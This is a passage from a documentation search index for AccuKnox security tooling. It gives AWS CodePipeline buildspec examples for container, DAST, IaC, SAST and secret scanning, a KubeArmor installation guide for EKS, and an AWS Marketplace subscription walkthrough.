IMAGE_TAG: \"test\"\n    IMAGE_TAR: \"image.tar\"\n\nphases:\n  pre_build:\n    commands:\n      - echo \"Installing AccuKnox ASPM scanner...\"\n      - pip install https://github.com/accuknox/aspm-scanner-cli/releases/download/v0.13.4/accuknox_aspm_scanner-0.13.4-py3-none-any.whl --break-system-packages\n  build:\n    commands:\n      - |\n        echo \"Running AccuKnox container scan\"\n        docker build -t $IMAGE:$IMAGE_TAG -f Dockerfile .\n        docker save -o $IMAGE_TAR $IMAGE:$IMAGE_TAG\n        docker load -i $IMAGE_TAR\n        if [ \"$SOFT_FAIL\" = \"true\" ]; then\n          SOFT_FAIL_ARG=\"--softfail\"\n        fi\n        CMD=\"image $IMAGE_NAME\"\n        [ -n \"$IMAGE_TAG\" ] &amp;&amp; CMD=\"image $IMAGE:$IMAGE_TAG\"\n        [ -n \"$SEVERITY\" ] &amp;&amp; CMD=\"$CMD --severity $SEVERITY\"\n        echo accuknox-aspm-scanner scan $SOFT_FAIL_ARG container --command \"$CMD\" --container-mode\n        accuknox-aspm-scanner scan $SOFT_FAIL_ARG container --command \"$CMD\" --container-mode\n\nartifacts:\n  files:\n    - '**/*'\n    - $IMAGE_TAR\n</code></pre>"},{"location":"integrations/aws-container-scan/#workflow-execution-without-accuknox","title":"Workflow Execution Without AccuKnox","text":"<p>Without security automation:</p> <ul> <li>Vulnerable images are unknowingly pushed to production.</li> <li>Developers rely on manual checks or periodic scans.</li> <li>Security issues are detected late, increasing remediation costs.</li> <li>No centralized vulnerability tracking or compliance validation.</li> </ul> <p></p>"},{"location":"integrations/aws-container-scan/#workflow-execution-with-accuknox","title":"Workflow Execution With AccuKnox","text":"<p>With AccuKnox integrated:</p> <ul> <li>Every push or pull request triggers a vulnerability scan.</li> <li>Insecure builds are blocked automatically.</li> <li>Findings are centralized in the AccuKnox dashboard.</li> <li>Developers are alerted in real-time and can act quickly.</li> <li>Continuous compliance with security baselines is maintained.</li> </ul> <p></p>"},{"location":"integrations/aws-container-scan/#viewing-results-in-accuknox","title":"Viewing Results in AccuKnox","text":"<ol> <li>After the pipeline run, log in to AccuKnox.</li> <li> <p>Navigate to Issues \u2192 RegistryScan. </p> </li> <li> <p>Locate your repository and click on the scanned image.</p> </li> <li>Explore metadata, vulnerability list, and scan history. </li> </ol>"},{"location":"integrations/aws-container-scan/#vulnerabilities-tab","title":"Vulnerabilities Tab","text":"<p>In the <code>Findings</code> section, the user can see the image-specific vulnerabilities in a list manner that contains relevant information.</p> <ul> <li>Displays CVEs and affected packages.</li> <li>Includes severity (CRITICAL, HIGH, etc.) and remediation advice.</li> </ul> <p>Let us know if you are seeking additional guidance in planning your cloud security program.</p>"},{"location":"integrations/aws-dast/","title":"Integrating AccuKnox DAST with AWS CodePipeline","text":"<p>This document contains the process of integrating AccuKnox DAST with AWS CodePipeline. By integrating AccuKnox DAST into the pipeline, you can identify and resolve security vulnerabilities for your applications.</p> <p></p>"},{"location":"integrations/aws-dast/#prerequisites","title":"Prerequisites","text":"<p>Before beginning the integration, ensure you have the following:</p> <ul> <li> <p>AWS CodePipeline access - Administrative access to create and modify pipelines.</p> <ul> <li>\ud83d\udcd6 Reference: Getting Started with AWS CodePipeline</li> <li>\ud83d\udcd6 Reference: Create a Pipeline in AWS CodePipeline</li> </ul> </li> <li> <p>AWS CodeBuild access - Make sure that you have added the <code>codestar-connections:UseConnection</code> IAM permission to your service role policy.</p> <ul> <li>\ud83d\udcd6 Reference: Getting Started with AWS CodeBuild</li> </ul> </li> <li> <p>AccuKnox UI access - Access to the AccuKnox platform.</p> </li> <li> <p>AWS IAM Configuration - Proper service role permissions configured.</p> <ul> <li>\ud83d\udcd6 Reference: Add permissions to your CodeBuild service role policy</li> </ul> </li> <li> <p>AccuKnox API credentials including:</p> <ul> <li>Authentication Token</li> <li>Endpoint URL</li> <li>Labels</li> </ul> </li> <li> <p>Repository Configuration</p> <ul> <li>Full clone enabled - Ensure AWS CodePipeline is configured to pass metadata that allows CodeBuild actions to perform a full Git clone.<ul> <li>\ud83d\udcd6 Reference: Enable Full Clone in AWS CodeBuild</li> </ul> </li> </ul> </li> </ul>"},{"location":"integrations/aws-dast/#configuration-steps","title":"Configuration Steps","text":""},{"location":"integrations/aws-dast/#step-1-configure-aws-codepipeline-environment-variables","title":"Step 1: Configure AWS CodePipeline Environment Variables","text":"<p>Add the following environment variables to your CodeBuild project or pipeline configuration.</p> <ul> <li>\ud83d\udcd6 Reference: Set Environment Variables in CodeBuild Project</li> </ul> Name Description Required Example Value <code>ACCUKNOX_ENDPOINT</code> The URL of the CSPM panel to push the scan results to. Yes <code>cspm.demo.accuknox.com</code> <code>ACCUKNOX_TOKEN</code> Token for authenticating with the AccuKnox CSPM panel. Refer to How to Create Tokens. Yes <code>your_api_token_here</code> <code>ACCUKNOX_LABEL</code> Labels to associate with the scan results in the AccuKnox platform. Yes <code>test123</code>"},{"location":"integrations/aws-dast/#step-2-configure-aws-codebuild-specification-buildspecyml","title":"Step 2: Configure AWS CodeBuild Specification (buildspec.yml)","text":"<p>Create or update your <code>buildspec.yml</code> file in your repository root with the following configuration:</p> <pre><code>version: 0.2\n\nenv:\n  variables:\n    SOFT_FAIL: \"true\"\n    TARGET_URL: \"[https://juice-shop.herokuapp.com/](https://juice-shop.herokuapp.com/)\"\n    DAST_SCAN_SCRIPT: \"zap-baseline.py\"\n\nphases:\n  pre_build:\n    commands:\n      - echo \"Installing AccuKnox ASPM scanner...\"\n      - pip install https://github.com/accuknox/aspm-scanner-cli/releases/download/v0.13.4/accuknox_aspm_scanner-0.13.4-py3-none-any.whl --break-system-packages\n\n  build:\n    commands:\n      - |\n        echo \"Running AccuKnox DAST scan\"\n        mkdir /tmp/scan-dir\n        chmod 777 /tmp/scan-dir\n        cd /tmp/scan-dir\n\n        if [ \"$SOFT_FAIL\" = \"true\" ]; then\n          SOFT_FAIL_ARG=\"--softfail\"\n        fi\n\n        ARGS=\"$DAST_SCAN_SCRIPT -t $TARGET_URL -I \"\n\n        echo accuknox-aspm-scanner scan $SOFT_FAIL_ARG dast --command \"$ARGS\" --container-mode\n        accuknox-aspm-scanner scan $SOFT_FAIL_ARG dast --command \"$ARGS\" --container-mode\n        cd -\n</code></pre>"},{"location":"integrations/aws-dast/#workflow-execution-without-accuknox","title":"Workflow Execution Without AccuKnox","text":"<p>Initially, the pipeline scans the application for vulnerabilities but does not forward results to AccuKnox, requiring manual review. </p>"},{"location":"integrations/aws-dast/#workflow-execution-with-accuknox","title":"Workflow Execution With AccuKnox","text":"<p>With AccuKnox integrated, scan results are automatically sent to AccuKnox for further risk assessment and remediation.</p>"},{"location":"integrations/aws-dast/#viewing-results-in-accuknox","title":"Viewing Results in AccuKnox","text":"<ol> <li>After the pipeline run, log in to AccuKnox.</li> <li> <p>To see all of your DAST findings, navigate to <code>AccuKnox &gt; Issues &gt; Findings</code> and select <code>DAST Findings</code>. </p> </li> <li> <p>Click on any finding to get more details. You can also click on the Create Ticket button to create a ticket. </p> </li> </ol> <p>Let us know if you are seeking additional guidance in planning your cloud security program.</p>"},{"location":"integrations/aws-iac-scan/","title":"AWS Code Pipeline - IaC Scan","text":"<p>This document explains how to integrate AccuKnox IaC Scan with AWS CodePipeline. By integrating AccuKnox IaC Scan into the pipeline, you can identify and resolve security vulnerabilities for your applications.</p>"},{"location":"integrations/aws-iac-scan/#prerequisites","title":"Prerequisites","text":"<p>Before beginning the integration, ensure you have the following:</p> <ul> <li>AWS CodePipeline access \u2013 Administrative access to create and modify pipelines.</li> </ul> <p>Reference</p> <ul> <li>Getting Started with AWS CodePipeline</li> <li>Create a Pipeline in AWS CodePipeline</li> </ul> <ul> <li>AWS CodeBuild access \u2013 Ensure that you have added the <code>codestar-connections:UseConnection</code> IAM permission to your service role policy.</li> </ul> <p>Reference</p> <ul> <li>Getting Started with AWS CodeBuild</li> </ul> <ul> <li> <p>AccuKnox UI access \u2013 Access to the AccuKnox platform.</p> </li> <li> <p>AWS IAM Configuration \u2013 Proper service role permissions configured.</p> </li> </ul> <p>Reference</p> <ul> <li>Add permissions to your CodeBuild service role policy</li> </ul> <ul> <li> <p>AccuKnox API credentials including Authentication Token, Endpoint URL, Labels</p> </li> <li> <p>Repository Configuration</p> </li> <li>Full clone enabled \u2013 Ensure AWS CodePipeline is configured to pass metadata that allows CodeBuild actions to perform a full Git clone.</li> </ul> <p>Reference</p> <ul> <li>Enable Full Clone in AWS CodeBuild</li> </ul>"},{"location":"integrations/aws-iac-scan/#configuration-steps","title":"Configuration Steps","text":""},{"location":"integrations/aws-iac-scan/#step-1-configure-aws-codepipeline-environment-variables","title":"Step 1: Configure AWS CodePipeline Environment Variables","text":"<p>Add the following environment variables to your CodeBuild project or pipeline configuration:</p> <p>Reference</p> <ul> <li>Set Environment Variables in CodeBuild Project</li> </ul> Name Description Required Example Value <code>ACCUKNOX_ENDPOINT</code> The URL of the CSPM panel to push the scan results to. Yes <code>cspm.demo.accuknox.com</code> <code>ACCUKNOX_TOKEN</code> Token for authenticating with the AccuKnox CSPM panel. Refer to How to Create Tokens. Yes <code>your_api_token_here</code> <code>ACCUKNOX_LABEL</code> Label used to categorize and organize scan results. Yes <code>test123</code>"},{"location":"integrations/aws-iac-scan/#step-2-configure-aws-codebuild-specification-buildspecyml","title":"Step 2: Configure AWS CodeBuild Specification (<code>buildspec.yml</code>)","text":"<p>Create or update your <code>buildspec.yml</code> file in your repository root with the following configuration:</p> <pre><code>version: 0.2\n\nenv:\n  variables:\n    SOFT_FAIL: \"true\"\n    DIRECTORY: \".\"\n    COMPACT: \"true\"\n    QUIET: \"true\"\n\nphases:\n  pre_build:\n    commands:\n      - echo \"Installing AccuKnox ASPM scanner...\"\n      - pip install https://github.com/accuknox/aspm-scanner-cli/releases/download/v0.13.4/accuknox_aspm_scanner-0.13.4-py3-none-any.whl --break-system-packages\n\n  build:\n    commands: |\n      echo \"Running AccuKnox IaC scan\"\n      if [ \"$SOFT_FAIL\" = \"true\" ]; then\n        SOFT_FAIL_ARG=\"--softfail\"\n      fi\n\n      CMD_ARGS=\"\"\n      [ -n \"$FILE\" ] &amp;&amp; CMD_ARGS=\"$CMD_ARGS --file $FILE\"\n      [ -n \"$DIRECTORY\" ] &amp;&amp; CMD_ARGS=\"$CMD_ARGS --directory $DIRECTORY\"\n      [ \"$COMPACT\" = \"true\" ] &amp;&amp; CMD_ARGS=\"$CMD_ARGS --compact\"\n      [ \"$QUIET\" = \"true\" ] &amp;&amp; CMD_ARGS=\"$CMD_ARGS --quiet\"\n      [ -n \"$FRAMEWORK\" ] &amp;&amp; CMD_ARGS=\"$CMD_ARGS --framework $FRAMEWORK\"\n\n      echo accuknox-aspm-scanner scan $SOFT_FAIL_ARG iac --command \"$CMD_ARGS\" --container-mode\n      accuknox-aspm-scanner scan $SOFT_FAIL_ARG iac --command \"$CMD_ARGS\" --container-mode\n</code></pre>"},{"location":"integrations/aws-iac-scan/#workflow-execution-with-accuknox","title":"Workflow Execution With AccuKnox","text":"<p>Once integrated, scan results are automatically sent to AccuKnox for risk assessment and remediation.</p>"},{"location":"integrations/aws-iac-scan/#viewing-results-in-accuknox","title":"Viewing Results in AccuKnox","text":"<ol> <li>After the pipeline run, log in to AccuKnox.</li> <li> <p>Navigate to AccuKnox \u2192 Issues \u2192 Findings, and select IaC Findings. </p> </li> <li> <p>Click any finding to view more details. </p> </li> <li> <p>Use the Create Ticket button to raise a ticket directly from the finding.</p> </li> </ol> <p>Let us know if you need additional guidance in planning your cloud security program.</p>"},{"location":"integrations/aws-kubearmor/","title":"AWS EKS - KubeArmor Integration","text":"<p>Step 1: Get KubeArmor\u2019s latest version from AWS Marketplace</p> <p>AWS KubeArmor Market place Subscription</p> <p></p> <p>[Note: Since KubeArmor is Open Source software pricing is $0]</p> <p></p> <p>[Note: By Clicking  Accept Terms you are Accepting the  End User License Agreement(EULA)]</p> <p>Download EULA from: End User License Agreement</p> <p>Step 2: Configure Software &gt; Select fulfillment option \u201cHelm chart\u201d and continue</p> <p></p> <p>Step 3: Set Launch target to \u201cAmazon Managed Kubernetes\u201d</p> <p></p> <p>Step 4: Select launch options</p> <ol> <li>If you have an EKS cluster ready, &gt; Select \"Launch on Existing Cluster\" .</li> <li>If you do not have an EKS cluster &gt; Create an EKS cluster by following these steps: AWS User Guide to Create a Cluster</li> </ol> <p></p> <p>Step 5: Access the EKS using any CLI (Powershell, EC2, Putty, etc.)</p> <p>If kubectl does not exist, install it following the given link: AWS User Guide to Install kubectl</p> <p>Step 6: Login to the EKS Cluster using the below command</p> <pre><code>aws eks --region &lt;regionname&gt; update-kubeconfig --name &lt;cluster-name&gt;\n</code></pre> <p>Example:</p> <pre><code>[root@ip-172-31-15-181 ~]# aws eks --region us-east-2 update-kubeconfig --name revalidation-kA-MP\nAdded new context arn:aws:eks:us-east-2:172721035794:cluster/revalidation-kA-MP to /root/.kube/config\n</code></pre> <p>Step 7: Create the required Service Account and Namespace</p> <p>Copy the command in Step 1 from the instruction and replace it with the RoleARN with EKSClusterRole that already exists. Also specify a namespace name and service account name as required.</p> <p></p> <pre><code>kubectl create namespace &lt;ENTER_NAMESPACE_HERE&gt;\n\neksctl create iamserviceaccount \\\n    --name &lt;ENTER_SERVICE_ACCOUNT_NAME_HERE&gt; \\\n    --namespace &lt;ENTER_NAMESPACE_HERE&gt; \\\n    --cluster &lt;ENTER_YOUR_CLUSTER_NAME_HERE&gt; \\\n    --attach-role-arn &lt;ENTER_ROLE_ARN_HERE&gt; \\\n    --approve \\\n    --override-existing-serviceaccounts\n</code></pre> <p>Example:</p> <pre><code>[root@ip-172-31-15-181 ~]# kubectl create namespace ns1re1\n\neksctl create iamserviceaccount \\\n    --name iamserviceaccountre123 \\\n    --namespace ns1re1 \\\n    --cluster revalidation-kA-MP \\\n    --attach-role-arn arn:aws:iam::172721035794:role/eksrole \\\n    --approve \\\n    --override-existing-serviceaccounts\nnamespace/ns1re1 created\n2023-08-02 05:20:58 [\u2139]  1 iamserviceaccount (ns1re1/iamserviceaccountre123) was included (based on the include/exclude rules)\n2023-08-02 05:20:58 [!]  metadata of serviceaccounts that exist in Kubernetes will be updated, as --override-existing-serviceaccounts was set\n2023-08-02 05:20:58 [\u2139]  1 task: { create serviceaccount \"ns1re1/iamserviceaccountre123\" }\n2023-08-02 05:20:58 [\u2139]  created serviceaccount \"ns1re1/iamserviceaccountre123\"\n[root@ip-172-31-15-181 ~]#\n</code></pre> <p>Step 8: Install KubeArmor via Helm Chart</p> <p>Step 8.1: Helm is required to be installed on local system</p> <p>Follow this link to install Helm if not installed: AWS User Guide to Install Helm</p> <p>Step 8.2: Install kubearmor via Helm Chart</p> <p>Copy and run the command shown in Step 2 of the instructions. [Note: Remember to replace the namespace with the correct namespace as specified in the command of Step 1]</p> <p></p> <pre><code>export HELM_EXPERIMENTAL_OCI=1\n\naws ecr get-login-password \\\n    --region us-east-1 | helm registry login \\\n    --username AWS \\\n    --password-stdin *************.dkr.ecr.us-east-1.amazonaws.com\n\nmkdir awsmp-chart &amp;&amp; cd awsmp-chart\n\nhelm pull oci://*************.dkr.ecr.us-east-1.amazonaws.com/accuknox/kubearmor --version 0.10.3\n\ntar xf $(pwd)/* &amp;&amp; find $(pwd) -maxdepth 1 -type f -delete\n\nhelm install kubearmor \\\n    --namespace &lt;ENTER_NAMESPACE_HERE&gt; ./*\n</code></pre> <p>Example:</p> <pre><code>[root@ip-172-31-15-181 awsmp-chart]# export HELM_EXPERIMENTAL_OCI=1\n\naws ecr get-login-password \\\n    --region us-east-1 | helm registry login \\\n    --username AWS \\\n    --password-stdin *************.dkr.ecr.us-east-1.amazonaws.com\n\nmkdir awsmp-chart &amp;&amp; cd awsmp-chart\n\nhelm pull oci://*************.dkr.ecr.us-east-1.amazonaws.com/accuknox/kubearmor --version 0.10.3\n\ntar xf $(pwd)/* &amp;&amp; find $(pwd) -maxdepth 1 -type f -delete\n\nhelm install kubearmor \\\n    --namespace ns1re1 ./*\nLogin Succeeded\nPulled: *************.dkr.ecr.us-east-1.amazonaws.com/accuknox/kubearmor:0.10.3\nDigest: sha256:3aab82a89f1302f7a8b91e2c138806593d5c4e4e8695a19204c388d3ce2e87b7\nNAME: kubearmor\nLAST DEPLOYED: Wed Aug  2 05:27:10 2023\nNAMESPACE: ns1re1\nSTATUS: deployed\nREVISION: 1\nTEST SUITE: None\n</code></pre> <p>Step 8.3: Check if KubeArmor has been deployed and running using the following command:</p> <pre><code>kubectl get ns\nkubectl get pods &lt;ENTER_NAMESPACE_HERE&gt;\n</code></pre> <p>Example:</p> <pre><code>[root@ip-172-31-15-181 awsmp-chart]# kubectl get ns\nNAME              STATUS   AGE\ndefault           Active   20h\nkube-node-lease   Active   20h\nkube-public       Active   20h\nkube-system       Active   20h\nns1re             Active   17m\nns1re1            Active   11m\n[root@ip-172-31-15-181 awsmp-chart]# kubectl get pods -n ns1re1\nNAME                                    READY   STATUS    RESTARTS   AGE\nkubearmor-controller-6dbbb8b69f-8w6jz   2/2     Running   0          5m6s\nkubearmor-f88ss                         1/1     Running   0          5m6s\nkubearmor-relay-5df7df7678-tk2xz        1/1     Running   0          5m6s\nkubearmor-xwdxd                         1/1     Running   0          5m6s\n</code></pre> <p>Step 9: Install Karmor CLI to be able to interact with KubeArmor</p> <p>Use the following command: <pre><code>curl -sfL http://get.kubearmor.io/ | sudo sh -s -- -b /usr/local/bin\n</code></pre></p> <p>Step 10: Follow the steps in the link below to execute a Sample use-case</p> <p>KubeArmor Demo Scenario Use Cases</p> <p>KubeArmor is an open-source sandbox project of AccuKnox which was donated to CNCF-Cloud Native Computing Foundation To contribute to the project, access the Github page. Learn more about KubeArmor here</p> <p>SCHEDULE DEMO</p>"},{"location":"integrations/aws-overview/","title":"AWS Integrations","text":""},{"location":"integrations/aws-overview/#aws-code-pipeline-integrations","title":"AWS Code Pipeline Integrations","text":"<p>SAST (Static Analysis)</p> <p>Container Scan</p> <p>IaC Scan</p> <p>DAST (Dynamic Analysis)</p> <p>Secret Scanning</p>"},{"location":"integrations/aws-playbook/","title":"AWS Installation Guide","text":"<p>This document illustrates the process of subscribing to AccuKnox via AWS Marketplace, encompassing the necessary actions within the marketplace, the subscription and access workflow, the post-registration access acquisition, and the subsequent steps following access attainment.</p>"},{"location":"integrations/aws-playbook/#steps-for-users-on-aws-marketplace","title":"Steps for Users on AWS Marketplace","text":"<p>The following steps cater to users who:</p> <ol> <li> <p>Desire to get a free trial from the marketplace.</p> </li> <li> <p>Desire to subscribe to existing public offers available in the marketplace.</p> </li> <li> <p>Need a private offer tailored to specific dimensions.</p> </li> <li> <p>Seek a recurring plan for public offers.</p> </li> </ol>"},{"location":"integrations/aws-playbook/#case-1-trying-accuknox-cnapp-with-free-trial","title":"Case 1:  Trying AccuKnox CNAPP with Free Trial","text":"<p>Step 1: The user initiates the process by searching for AccuKnox CNAPP on the marketplace</p> <p></p> <p>Step 2: After reviewing our offerings, the user proceeds to locate the Try for free option.</p> <p></p> <p>Step 3: Within this section, they can choose one of the two available offers - Choose the Free trial</p> <p></p> <p>Step 4: The free trial lasts for 30 days and cannot be renewed. Click on Subscribe to Free Trial</p> <p></p> <p>Step 5: Once the contract is confirmed as completed, the user will receive a prompt to Set Up Your Account for SaaS access.</p> <p></p> <p>NOTE</p> <p>If they desire a custom solution beyond the provided offers, they have the option to contact AccuKnox support to discuss alternative possibilities. Contact: support@accuknox.com</p> <p> Step 6: Clicking this button redirects the user to a registration page, where they provide their information, including their name, phone number, organization name, and email address.</p> <p></p> <p></p> <p>Step 7: This information is forwarded to AccuKnox Support, and after verification by our support team, a confirmation email is sent.</p> <p></p> <p>Step 8: At this juncture, we strongly recommend scheduling a DEMO with AccuKnox to assist the customer with the onboarding steps and gain a deeper understanding of our features.</p> <p>Step 9: Shortly after configuring a tenant for the customer, we will send them an invitation to access the SaaS platform and leverage its security features.</p> <p>NOTE</p> <p>The free trial subscription on the marketplace is only available to the user for a month. After one month, we will be revoking all access of the user to our Saas Platform. Hence, Before the end of the monthly subscription, we will notify the user. If user still wants to continue using the platform they can refer to case 3 &amp; case 4.</p>"},{"location":"integrations/aws-playbook/#case-2-purchasing-accuknox-subscription-on-aws","title":"Case 2: Purchasing AccuKnox Subscription on AWS","text":"<p>Step 1: The user initiates the process by searching for AccuKnox CNAPP on the marketplace</p> <p></p> <p>Step 2: After reviewing our offerings, the user proceeds to locate the View purchase options button.</p> <p></p> <p>Step 3: Within this section, they can choose one of the two available offers - Choose the Public Offer</p> <p></p> <p>Step 4: Select one of the Contract options based on the Assets usage(Refer How to count my Assets). The contract period is one month and the user can optionally select the auto-renew option.</p> <p></p> <p>Note: If they desire a custom solution beyond the provided offers, they have the option to contact AccuKnox support to discuss alternative possibilities. Contact: support@accuknox.com</p> <p>Step 5: Upon selecting an offer, they will be prompted to accept the contract, which triggers the payment process and the amount is automatically billed to their AWS account.</p> <p></p> <p>Step 6: Once the contract is confirmed as completed, the user will receive a prompt to Set Up Your Account for SaaS access.</p> <p></p> <p>Follow Steps 6 to 9 from Case 1 complete the registration process and gain access to the SaaS platform.</p> <p>NOTE</p> <p>The subscription is based on usage and you can upgrade your contract when usage increases. The contract is valid for a month and needs to be renewed after the one month period. The user can set up auto renew to automate the renewal process and continue using the platform.</p>"},{"location":"integrations/aws-playbook/#case-3-custom-subscription-purchase-after-demo","title":"Case 3: Custom Subscription Purchase after Demo","text":"<p>To proceed in this process, the customer should have a good understanding of the platform since these initial steps should have already been completed:</p> <ul> <li>Introduction to AccuKnox CNAPP</li> <li>Live Platform Demo, Covering Various Use Cases</li> <li>Proof of Concept (POC) Conducted in Their Environment</li> </ul> <p>Step 1: Following discussions about licensing and pricing, we can tailor a private offer specifically for the organization to meet their requirements.</p> <p>Step 2: This private offer will be associated with a particular AWS account, so the organization must provide their AWS account number.</p> <p>Step 3: After creating and obtaining approval from AWS for the private offer, it will be listed on the marketplace for the provided AWS account.</p> <p>Step 4: The customer should then log in to that AWS account, search for AccuKnox CNAPP on the marketplace, and locate the private offer to initiate the contract signing.</p> <p></p> <p></p> <p>Step 5: Once the contract is confirmed and completed, the user will be prompted to Set Up Your Account for SaaS access.</p> <p></p> <p>Follow Steps 6 to 9 from Case 1 complete the registration process and gain access to the SaaS platform.</p>"},{"location":"integrations/aws-playbook/#case-4-continuing-from-trial-to-full-subscription","title":"Case 4: Continuing from Trial to Full Subscription","text":"<p>The Trial Offer listed on the MarketPlace is one time and available to a user only for a single month. This offer is meant for trial purposes only.</p> <p>Option 1: If the user wants to continue using the product they can contact the support team and we will create a Private Offer that adheres to our policies and works best for you.</p> <p>After the Private Offer is created, User can refer to Case 3 to see the next steps.</p> <p>Option 2: The user also has the option to select one of the public offers available from the marketplace to continue the subscription.</p> <p>If the user is satisfied with the Public Offers, they can refer to Case 2 for the next steps.</p>"},{"location":"integrations/aws-playbook/#next-steps-post-subscription","title":"Next Steps Post-Subscription","text":"<p>Upon confirmation of the contract and subscription, AccuKnox Support will contact the customer via the email address provided during registration to acknowledge their subscription.</p> <p>Following this, the AccuKnox team will proceed to provision a dedicated tenant and subsequently share the access credentials with the customer. This access will include a username and a temporary password for accessing the AccuKnox SaaS platform. Upon initial login, users will be prompted to configure multi-factor authentication (MFA) for enhanced security.</p> <p>Once MFA setup is complete, users can refer to the provided playbook for onboarding, enabling them to fully leverage all the features of the SaaS platform.</p> <p>SCHEDULE DEMO</p>"},{"location":"integrations/aws-sast/","title":"AccuKnox SAST Integration with AWS CodePipeline","text":"<p>This document contains the process of integrating AccuKnox SAST (Static Application Security Testing) with AWS CodePipeline. By integrating AccuKnox SAST into your CI/CD pipeline, you can identify and resolve security vulnerabilities proactively before they are deployed.</p>"},{"location":"integrations/aws-sast/#prerequisites","title":"Prerequisites","text":"<p>Before beginning the integration, ensure you have the following:</p> <ul> <li> <p>AWS CodePipeline access - Administrative access to create and modify pipelines.</p> <ul> <li>\ud83d\udcd6 Reference: Getting Started with AWS CodePipeline</li> <li>\ud83d\udcd6 Reference: Create a Pipeline in AWS CodePipeline</li> </ul> </li> <li> <p>AWS CodeBuild access - Make sure that you have added the <code>codestar-connections:UseConnection</code> IAM permission to your service role policy.</p> <ul> <li>\ud83d\udcd6 Reference: Getting Started with AWS CodeBuild</li> </ul> </li> <li> <p>AccuKnox UI access - Access to the AccuKnox platform.</p> </li> <li> <p>AWS IAM Configuration - Proper service role permissions configured.</p> <ul> <li>\ud83d\udcd6 Reference: Add permissions to your CodeBuild service role policy</li> </ul> </li> <li> <p>AccuKnox SAST API credentials, including:</p> <ul> <li>Authentication Token</li> <li>Endpoint URL</li> <li>Labels</li> </ul> </li> <li> <p>Repository Configuration:</p> <ul> <li>Full clone enabled - Ensure AWS CodePipeline is configured to pass metadata that allows CodeBuild actions to perform a full Git clone.<ul> <li>\ud83d\udcd6 Reference: Enable Full Clone in AWS CodeBuild</li> </ul> </li> </ul> </li> </ul>"},{"location":"integrations/aws-sast/#configuration-steps","title":"Configuration Steps","text":""},{"location":"integrations/aws-sast/#step-1-configure-aws-codepipeline-environment-variables","title":"Step 1: Configure AWS CodePipeline Environment Variables","text":"<p>Add the following environment variables to your CodeBuild project or pipeline configuration.</p> <ul> <li>\ud83d\udcd6 Reference: Set Environment Variables in CodeBuild Project</li> </ul> Name Description Required Example Value <code>ACCUKNOX_ENDPOINT</code> The URL of the CSPM panel to push the scan results to. Yes <code>cspm.demo.accuknox.com</code> <code>ACCUKNOX_TOKEN</code> Token for authenticating with the AccuKnox CSPM panel. Refer to How to Create Tokens. Yes <code>your_api_token_here</code> <code>ACCUKNOX_LABEL</code> The label used to categorize and identify scan results in AccuKnox. Refer to How to Create Labels. Yes <code>test123</code>"},{"location":"integrations/aws-sast/#step-2-configure-aws-codebuild-specification-buildspecyml","title":"Step 2: Configure AWS CodeBuild Specification (buildspec.yml)","text":"<p>Create or update your <code>buildspec.yml</code> file in your repository root with the following configuration:</p> <pre><code>version: 0.2\n\nenv:\n  variables:\n    SOFT_FAIL: \"true\"\n\nphases:\n  pre_build:\n    commands:\n      - echo \"Installing AccuKnox ASPM scanner...\"\n      - pip install https://github.com/accuknox/aspm-scanner-cli/releases/download/v0.13.4/accuknox_aspm_scanner-0.13.4-py3-none-any.whl --break-system-packages\n\n  build:\n    commands:\n      - echo \"Running AccuKnox sast scan\"\n      - |\n        if [ \"$SOFT_FAIL\" = \"true\" ]; then\n          SOFT_FAIL_ARG=\"--softfail\"\n        fi\n        echo \"Installing AccuKnox scanner...\"\n        echo \"Running SAST scan...\"\n        accuknox-aspm-scanner tool install --type sast\n        accuknox-aspm-scanner scan $SOFT_FAIL_ARG sast --command \"scan .\"\n</code></pre>"},{"location":"integrations/aws-sast/#workflow-execution-without-accuknox","title":"Workflow Execution Without AccuKnox","text":"<p>Initially, the pipeline scans the code for vulnerabilities but does not forward results to AccuKnox, requiring manual review.</p> <p></p>"},{"location":"integrations/aws-sast/#workflow-execution-with-accuknox","title":"Workflow Execution With AccuKnox","text":"<p>With AccuKnox integrated, scan results are automatically sent to the AccuKnox platform for further risk assessment and remediation.</p>"},{"location":"integrations/aws-sast/#viewing-results-in-accuknox","title":"Viewing Results in AccuKnox","text":"<ol> <li>After the pipeline run, log in to AccuKnox.</li> <li> <p>Navigate to Issues &gt; Findings and select Opengrep Findings. </p> </li> <li> <p>Inspect vulnerabilities, apply fixes, and create tracking tickets if necessary. </p> </li> </ol>"},{"location":"integrations/aws-secret-scan/","title":"AWS Code Pipeline - Secret Scan","text":"<p>This document contains the process of integrating AccuKnox Secret Scan with AWS CodePipeline. By integrating AccuKnox Secret Scan into the pipeline, you can identify and resolve security vulnerabilities for your applications.</p>"},{"location":"integrations/aws-secret-scan/#prerequisites","title":"Prerequisites","text":"<p>Before beginning the integration, ensure you have the following:</p> <ul> <li> <p>AWS CodePipeline access \u2013 Administrative access to create and modify pipelines   \ud83d\udcd6 Reference: Getting Started with AWS CodePipeline   \ud83d\udcd6 Reference: Create a Pipeline in AWS CodePipeline</p> </li> <li> <p>AWS CodeBuild access \u2013 Make sure that you have added the <code>codestar-connections:UseConnection</code> IAM permission to your service role policy.   \ud83d\udcd6 Reference: Getting Started with AWS CodeBuild</p> </li> <li> <p>AccuKnox UI access \u2013 Access to the AccuKnox platform</p> </li> <li> <p>AWS IAM Configuration \u2013 Proper service role permissions configured   \ud83d\udcd6 Reference: Add permissions to your CodeBuild service role policy</p> </li> <li> <p>AccuKnox API credentials, including:</p> <ul> <li>Authentication Token</li> <li>Endpoint URL</li> <li>Labels</li> </ul> </li> <li> <p>Repository Configuration:</p> </li> <li>Full clone enabled \u2013 Ensure AWS CodePipeline is configured to pass metadata that allows CodeBuild actions to perform a full Git clone     \ud83d\udcd6 Reference: Enable Full Clone in AWS CodeBuild</li> </ul>"},{"location":"integrations/aws-secret-scan/#configuration-steps","title":"Configuration Steps","text":""},{"location":"integrations/aws-secret-scan/#step-1-configure-aws-codepipeline-environment-variables","title":"Step 1: Configure AWS CodePipeline Environment Variables","text":"<p>Add the following environment variables to your CodeBuild project or pipeline configuration. \ud83d\udcd6 Reference: Set Environment Variables in CodeBuild Project</p> Name Description Required Example Value <code>ACCUKNOX_ENDPOINT</code> The URL of the CSPM panel to push the scan results to Yes <code>cspm.demo.accuknox.com</code> <code>ACCUKNOX_TOKEN</code> Token for authenticating with the AccuKnox CSPM panel. How to Create Tokens Yes <code>your_api_token_here</code> <code>ACCUKNOX_LABEL</code> Label identifier for organizing scan results Yes <code>test123</code>"},{"location":"integrations/aws-secret-scan/#step-2-configure-aws-codebuild-specification-buildspecyml","title":"Step 2: Configure AWS CodeBuild Specification (<code>buildspec.yml</code>)","text":"<p>Create or update your <code>buildspec.yml</code> file in your repository root with the following 